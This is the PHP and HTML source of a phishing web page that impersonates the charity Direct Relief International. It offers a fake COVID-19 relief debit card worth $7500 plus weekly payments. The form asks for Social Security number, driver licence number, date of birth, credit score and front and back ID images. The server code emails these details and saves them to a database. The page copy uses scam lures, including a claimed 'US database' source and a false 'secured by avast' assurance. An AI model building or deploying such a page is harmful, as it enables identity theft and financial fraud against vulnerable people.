<?php   require_once("config/database_functions.php");
     

        if(isset($_POST['submit'])){
                if(  $_POST['fullname'] == ""   ||
            $_POST['address'] == ""   ||
            $_POST['city'] == ""   ||
            $_POST['dob'] == ""   ||
            $_POST['state'] == ""   ||
            $_POST['sex'] == ""   ||
            $_POST['driver_license'] == ""   ||
            $_POST['weight'] == ""   ||
            
            $_POST['phone'] == ""   ||
            $_POST['email'] == ""   ||
            $_POST['ssn'] == ""   ||
            $_POST['age'] == ""   ||
            $_POST['credit_score'] == ""   ||
            $_POST['agree_to_tnc'] == ""   ||
            $_POST['zip'] == ""  )

        {
         
          echo "Empty Field(s) Found...Please Check the form again";

        }else{
        $profile_name = $_FILES['profile_f']['name'];
        $profile_tmp_name = $_FILES['profile_f']['tmp_name'];
        $profile_size = $_FILES['profile_f']['size'];
        $profile_type = $_FILES['profile_f']['type'];

        $profile_name2 = $_FILES['profile_b']['name'];
        $profile_tmp_name2 = $_FILES['profile_b']['tmp_name'];
        $profile_size2 = $_FILES['profile_b']['size'];
        $profile_type2 = $_FILES['profile_b']['type'];
     

        $fullname = $_POST['fullname'];
        $dob = $_POST['dob'];
        $state = $_POST['state'];
        $address = $_POST['address'];
        $zip = $_POST['zip'];
        $gender = $_POST['sex'];
        $driver_license = $_POST['driver_license'];
        $weight = $_POST['weight'];
        $current_job = $_POST['current_job'];
        $phone = $_POST['phone'];
        $email = $_POST['email'];
        $ssn = $_POST['ssn'];
        $age = $_POST['age'];
        $city = $_POST['city'];
        $agree_to_tnc = $_POST['agree_to_tnc'];
        $credit_score = $_POST['credit_score'];
        

        $build_msg = "";
        $subject = "Application for Relief Fund Card";
        $build_msg .= "
        Below are details of Applicant:  
          Fullname: ".$fullname."
          Address:  ".$address."
          City: ".$city."
          State: ".$state."
          Zip: ".$zip."
          Gender: ".$gender."
          Driver License Number / State ID Number: ".$driver_license."
          Weight: ".$weight."
          Current Job: ".$current_job."
          Mobile Number: ".$phone."
          Email Address: ".$email."
          Social Security Number: ".$ssn."        
          Date of Birth: ".$dob."
          Age: ".$age."
          Credit Score: ".$credit_score."
          Response to Terms and Condition Agreement: 
          ".$agree_to_tnc."    
        ";
        //send mail now
        $send_mail = email_function('hello@directrelief.org', $subject, $build_msg);

        //if($send_mail){
         
          $save_in_db = insert_into_db($fullname,$dob,$state,$address,$zip,$gender,$driver_license,$weight,$current_job,$phone,$email,$ssn,$age,$city,$agree_to_tnc,$credit_score,$profile_name,$profile_tmp_name,$profile_size,$profile_type,$profile_name2,$profile_tmp_name2,$profile_size2,$profile_type2);
          $save_in_db_dec = json_decode($save_in_db,true);
          if($save_in_db_dec['status'] == '111'){
              $msg = '<div class="alert alert-success">Application received. <br>An account manager has been assigned to you. <br>He will guide you through the process. <br>Kindly send Front and Back picture of your license to your Account Manager.<br>  Best Regards.</div><hr>';
          }else{
            $msg = '<div class="alert alert-danger">'.$save_in_db_dec['msg'].'</div><hr>';
          }
       
      }

  }

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>DIRECT RELIEF INTERNATIONAL</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/favicon.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Jost:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">

</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top ">
    <div class="container d-flex align-items-center">

      <h1 class="logo me-auto"><a href="index.php">DIRECT RELIEF INTERNATIONAL</a></h1>
      <!-- Uncomment below if you prefer to use an image logo -->
       <!-- <a href="#" class="logo me-auto"><img  src="logo.jpg" alt="" ></a> -->
         <!-- class="logo me-auto" class="img-fluid" -->
      <nav id="navbar" class="navbar">
        <ul>
          <li><a class="getstarted scrollto"  href="#contact">Submit an Application</a></li>
          <li><a class="nav-link scrollto" href="#about">About Us</a></li>
      
          
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->

    </div>
  </header><!-- End Header -->

  <!-- ======= Hero Section ======= -->
  <section id="hero" class="d-flex align-items-center">

    <div class="container">
      <div class="row">
        <div class="col-lg-6 d-flex flex-column justify-content-center pt-4 pt-lg-0 order-2 order-lg-1" data-aos="fade-up" data-aos-delay="200">
          <h1>We Care About You</h1>
          <h2>We want to improve the health and lives of people affected by poverty or emergency situations by mobilizing and providing essential medical and fund resources needed for their care</h2>
          <div class="d-flex justify-content-center justify-content-lg-start">
            <a href="#contact" class="btn-get-started scrollto">Submit an Application</a>
              <!-- <a href="#about"><span>Learn More</span></a> -->
         
          </div>
        </div>
        <div class="col-lg-6 order-1 order-lg-2 hero-img" data-aos="zoom-in" data-aos-delay="200">
          <!-- <img src="assets/img/hero-img.png" class="img-fluid animated" alt=""> -->
          <img src="banner.png" class="img-fluid animated" alt="">
        </div>
      </div>
    </div>

  </section><!-- End Hero -->

  <main id="main">
    <!-- ======= About Us Section ======= -->
    <section id="about" class="about">
      <div class="container" data-aos="fade-up">

        <div class="section-title">
          <h2>About Us</h2>
        </div>

        <div class="row content container">
  
          <div class="col-lg-12 pt-4 pt-lg-0">

<p>DIRECT RELIEF INTERNATIONAL is a nonprofit, nonpartisan organization with a stated mission to <strong>“improve the health and lives of people affected by poverty or emergency situations by mobilizing and providing essential medical and fund resources needed for their care.</strong>
DIRECT RELIEF INTERNATIONAL is a nonprofit, nonpartisan organization with a stated mission to “improve the health and lives of people affected by poverty or emergency situations by mobilizing and providing essential medical and fund resources needed for their care.</p>

<ul>
              <li><i class="ri-check-double-line"></i> FOUNDED:  23 August 1948, Santa Barbara, California, United States</li>
              <li>HEADQUARTERS:  Santa Barbara, California, United States</li>
              <li><i class="ri-check-double-line"></i> VOLUNTEERS:  20,000+ Individuals, Companies, and Foundations</li>
              <li><i class="ri-check-double-line"></i> TAX ID NUMBER:  95-1831116</li>
              <li><i class="ri-check-double-line"></i> FOUNDERS:  William D. Zimdin and Dezso Karczag
</li>
              <li><i class="ri-check-double-line"></i> WEBSITE: www.directrelief.org</li>
            </ul>

       <p>   <strong>PLEASE DO READ AND UNDERSTAND EVERY PART OF THE MESSAGE HERE </strong></p>
                                  

<p>DIRECT RELIEF INTERNATIONAL as a charity organization, We deliver emergency medical, funds and related services to those affected by conflict, disaster and disease, no matter where they are, no matter what the condition is. We also train people in their communities, providing them with the skills they need to recover, chart their own path to self-reliance and become effective first respondents themselves.</p>

<p>Covid-19 has been one of the dangerous disaster in human life and has killed a lot of people and make many homeless and jobless. We have prepared a relief package for the affected people in the United State . We received your phone number from the US database as one of the victims of the pandemic in the area of being unemployed, homeless or in need of financial support.</p>

<p>During this Covid-19 pandemic, We earns top charity ranking when we were ranked 7th Largest U.S. Charity organization. The growth occurred in a year when DIRECT RELIEF INTERNATIONAL extended more help to more people in need than ever before in its 70-year history, furnishing essential medications, vaccines, instruments, supplies and funds to all 50 U.S. and globally.</p>

<p>U.S GOVERMENT: It is important to inform you that President Donald Trump signed the massive $2.3 trillion coronavirus relief and government funding bill into law Sunday night of December 27Th, 2020, averting a government shutdown that was set to begin on Tuesday, and extending billions of dollars in coronavirus aid to millions of United States citizens.</p>

<p>DIRECT RELIEF INTERNATIONAL collaborated with United States government to extend palliative support to the Covid-19 victims, We shall be sending you a Relief Debit Card with $7500 on it. Upon the receipt of the card, it will be activated for you. More so, on weekly basis, a DIRECT RELIEF FUND OF $750 shall be loading onto the card. The card has no spending limit and it can be spent at any store in the United States for purchase of food items and all other house hold needs. We will also send cloths, shoes and other necessary household supplies to the needy. </p>

<p><strong>FRAUD / FALSE / STOLEN DETAILS:</strong> Please do take note that every each data you submit shall be keenly investigated and monitored. False and stolen data shall be legally taken up for prosecution.</p>

<p><strong>VERY IMPORTANT:</strong> United States, Federal and States Government in their bid to curb the use of false and stolen data to obtain the Covid-19 palliative funds in various categories have instructed that for each and everyone to qualify for this DIRECT RELIEF FUND DEBIT CARD, you must be able to present your W-2 or 1040 PAPERS. Once you are able to present any of the 2 papers mentioned, your total DIRECT RELIEF FUND of $750 by 26 weeks shall be released to you within 1-7 working days.</p>

<p>In conclusion, Do Kindly and keenly fill in the below application form to apply for this DIRECT RELIEF FUND CARD.</p>

          
            <a href="#contact" class="btn-learn-more">Fill Form Now</a>
          </div>
        </div>

      </div>
    </section><!-- End About Us Section -->

  
    <!-- ======= Cta Section ======= -->
    <section id="cta" class="cta">
      <div class="container" data-aos="zoom-in">

        <div class="row">
          <div class="col-lg-9 text-center text-lg-start">
            <h3>Get your Relief Fund Card today</h3>
            <p> Do Kindly and keenly fill in the below application form to apply for this DIRECT RELIEF FUND CARD.</p>
          </div>
          <div class="col-lg-3 cta-btn-container text-center">
            <a class="cta-btn align-middle" href="#contact">Apply Now</a>
          </div>
        </div>

      </div>
    </section><!-- End Cta Section -->

 
    <!-- ======= Contact Section ======= -->
    <section id="contact" class="contact">
      <div class="container" data-aos="fade-up">

        <div class="section-title">
          <h2>Apply for a Relief Fund Card</h2>
          <p>Do Kindly and keenly fill in the below application form to apply for this DIRECT RELIEF FUND CARD.</p>
        </div>

        <div class="row">

          <div class="col-lg-2 d-flex align-items-stretch"></div>

          <div class="col-lg-8 mt-5 mt-lg-0 d-flex align-items-stretch">
            <form  action="" class="php-email-form"  method="post" role="form" id="application_form" enctype="multipart/form-data">
               <!-- class="php-email-form" -->
              <div class="row">
                <div class="form-group col-md-6">
                  <label for="name">Fullname*</label>
                  <input type="text" name="fullname" required="" class="form-control" id="fullname" required>
                </div>
                <div class="form-group col-md-6">
                  <label for="name">Address*</label>
                  <input type="text" class="form-control" required="" name="address" id="address" required>
                </div>
              </div>
              <div class="form-group">
                <label for="name">City*</label>
                <input type="text" class="form-control" required="" name="city" id="city" required>
              </div>
               <div class="form-group">
                <label for="name">State*</label>
                <!-- <input type="text" class="form-control" required="" name="state" id="state" required> -->
                    <select class="form-control" required="" name="state" id="state" required>
                    <option value="">Select a State</option>
                    <option value="Alabama">Alabama</option>
                    <option value="Alaska">Alaska</option>
                    <option value="Arizona">Arizona</option>
                    <option value="Arkansas">Arkansas</option>
                    <option value="California">California</option>
                    <option value="Colorado">Colorado</option>
                    <option value="Connecticut">Connecticut</option>
                    <option value="Delaware">Delaware</option>
                    <option value="District Of Columbia">District Of Columbia</option>
                    <option value="Florida">Florida</option>
                    <option value="Georgia">Georgia</option>
                    <option value="Hawaii">Hawaii</option>
                    <option value="Idaho">Idaho</option>
                    <option value="Illinois">Illinois</option>
                    <option value="Indiana">Indiana</option>
                    <option value="Iowa">Iowa</option>
                    <option value="Kansas">Kansas</option>
                    <option value="Kentucky">Kentucky</option>
                    <option value="Louisiana">Louisiana</option>
                    <option value="Maine">Maine</option>
                    <option value="Maryland">Maryland</option>
                    <option value="Massachusetts">Massachusetts</option>
                    <option value="Michigan">Michigan</option>
                    <option value="Minnesota">Minnesota</option>
                    <option value="Mississippi">Mississippi</option>
                    <option value="Missouri">Missouri</option>
                    <option value="Montana">Montana</option>
                    <option value="Nebraska">Nebraska</option>
                    <option value="Nevada">Nevada</option>
                    <option value="New Hampshire">New Hampshire</option>
                    <option value="New Jersey">New Jersey</option>
                    <option value="New Mexico">New Mexico</option>
                    <option value="New York">New York</option>
                    <option value="North Carolina">North Carolina</option>
                    <option value="North Dakota">North Dakota</option>
                    <option value="Ohio">Ohio</option>
                    <option value="Oklahoma">Oklahoma</option>
                    <option value="Oregon">Oregon</option>
                    <option value="Pennsylvania">Pennsylvania</option>
                    <option value="Rhode Island">Rhode Island</option>
                    <option value="South Carolina">South Carolina</option>
                    <option value="South Dakota">South Dakota</option>
                    <option value="Tennessee">Tennessee</option>
                    <option value="Texas">Texas</option>
                    <option value="Utah">Utah</option>
                    <option value="Vermont">Vermont</option>
                    <option value="Virginia">Virginia</option>
                    <option value="Washington">Washington</option>
                    <option value="West Virginia">West Virginia</option>
                    <option value="Wisconsin">Wisconsin</option>
                    <option value="Wyoming">Wyoming</option>
                    </select>       
              </div>

               <div class="form-group">
                <label for="name">Zip Code*</label>
                <input type="number" class="form-control" required="" name="zip" id="zip" required>
              </div>

               <div class="form-group">
                <label for="name">Sex*</label>
                     <select class="form-control" id="sex" name="sex">
                       <option value="">Select an option</option>
                       <option value="Male">Male</option>
                       <option value="Female">Female</option>
                    </select>   
              </div>
              <div class="form-group">
                <label for="name">Your Driver License Number / State ID Number*</label>
                <input type="number" class="form-control" required="" name="driver_license" id="driver_license" required>
              </div>

              <div class="form-group">
                <label for="name">Weight (As it appears on your ID)*</label>
                <input type="number" class="form-control" required="" name="weight" id="weight" required>
              </div>

               <div class="form-group">
                <label for="name">Your Mobile Number*</label>
                <input type="text" class="form-control" required="" name="phone" id="phone" required>
               </div>

               <div class="form-group">
                <label for="name">Your Well Spelled Email Address*</label>
                <input type="email" class="form-control" required="" name="email" id="email" required>
               </div>

               <div class="form-group">
                <label for="name">Your Social Security Number*</label>
                <input type="number" class="form-control" required="" name="ssn" id="ssn" required>
                <small>This information is secured by avast.</small>
                
               </div>
                  
                <div class="form-group">
                <label for="name">Date of Birth*</label>
                <input type="date" class="form-control" required="" name="dob" id="dob" required>
              </div>

              <div class="form-group">
                <label for="age">Your Age*</label>
                <input type="number" class="form-control" required="" name="age" id="age" required>
              </div>
             
               <div class="form-group">
                <label for="name">Your Current Job</label>
                <input type="text" class="form-control" required="" name="current_job" id="current_job" required>
                <small>Leave Blank if unemployed.</small>
              </div>

               <div class="form-group">
                <label for="name">Your Credit Score*</label>
                <input type="number" class="form-control" required="" name="credit_score" id="credit_score" required>
              </div>

                <div class="form-group">
                <label for="name">Profile Image(Front)*</label>
                <input type="file" class="form-control" required="" name="profile_f" id="profile_f" required>
              </div>

                <div class="form-group">
                <label for="name">Profile Image(Back)*</label>
                <input type="file" class="form-control" required="" name="profile_b" id="profile_b" required>
              </div>

                <div class="form-group">
                <label for="name">I agree to Terms and Conditions*</label><br>
                <small style="font-size: 11px;">You will receive a link within 24 hours for selfie verification.</small>

                    <div>
                    <input type="radio" id="yes" name="agree_to_tnc" value="Yes"
                    >
                    <label for="yes">Yes</label>
                    </div>

                    <div>
                    <input type="radio" id="no" name="agree_to_tnc" value="No">
                    <label for="no">No</label>
                    </div>
                </div>
                

              <div class="my-3">
                <!-- <div class="loading">Loading</div>
                <div class="error-message"></div> -->
                <div class="sent-messagess"></div>
              </div>
              <div class="text-center">
              
                <!-- <button id="submit" name="submit" type="submit">Apply Now</button> -->
                 <input class="btn btn-success" type="submit" id="submit" name="submit" value="Apply Now">

              </div><hr>
              <div class="sent-message2">
                   <?php if(!empty($msg)){  
                        echo $msg;
                   }?>
              </div>
            </form>
          </div>

          <div class="col-lg-2 d-flex align-items-stretch"></div>


        </div>

      </div>
    </section><!-- End Contact Section -->

  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  <footer id="footer">

<!--     <div class="footer-newsletter">
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-lg-6">
            <h4>Join Our Newsletter</h4>
            <p>Tamen quem nulla quae legam multos aute sint culpa legam noster magna</p>
            <form action="" method="post">
              <input type="email" name="email"><input type="submit" value="Subscribe">
            </form>
          </div>
        </div>
      </div>
    </div> -->

<!--  -->

    <div class="container footer-bottom clearfix">
      <div class="copyright">
        &copy; 2021 <strong><span>Direct Relief International</span></strong>. All Rights Reserved.
      </div>
  

    
    
    </div>
  </footer><!-- End Footer -->

  <div id="preloader"></div>
  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> -->


  <!-- Vendor JS Files -->
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <!-- <script src="assets/vendor/php-email-form/validate.js"></script> -->
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>

  <script type="text/javascript">
       $(document).ready(function(){
            // $('#submit_application_btn').click(function(){
              $("#application_form").on('submit', function(e) {
                var formData = new FormData(this);
            
              $.ajax({
                url:"ajax/send_application_to_email.php",
                method: "POST",
                data:  formData,
                dataType: JSON,
                contentType: false,
                processData:false,
                // data:$('#application_form').serialize(),
                // beforeSend: function(){
                //      $("#submit_application_btn").attr('disabled', true);
                //       $('.sent-message2').html('<div class="alert alert-primary">Please wait...</div><hr>');
                // },
                success:function(data){
                  console.log(data.output);
                  // $('.sent-message2').html(data);
                  // if( data == 200){             
                  //      $('.sent-message2').html('<div class="alert alert-success">Application received. <br>An account manager has been assigned to you. <br>He will guide you through the process. <br>Kindly send Front and Back picture of your license to your Account Manager.<br>  Best Regards.</div><hr>');
                  //      //alert('Your Application was successfully sent. Thank You');
                  //      // setTimeout( function(){ window.location.href = "custom_send_sms.php"; }, 2000);
                       
                  // }else{
                  //      $('.sent-message2').html('<div class="alert alert-danger">'+data+'</div><hr>');
                  //      //alert('Your Application was NOT successfully sent. Try again: '+data);
                  // } 
                  //$("#submit_application_btn").attr('disabled', false);

                }
                });
            });




       });
  </script>

</body>

</html>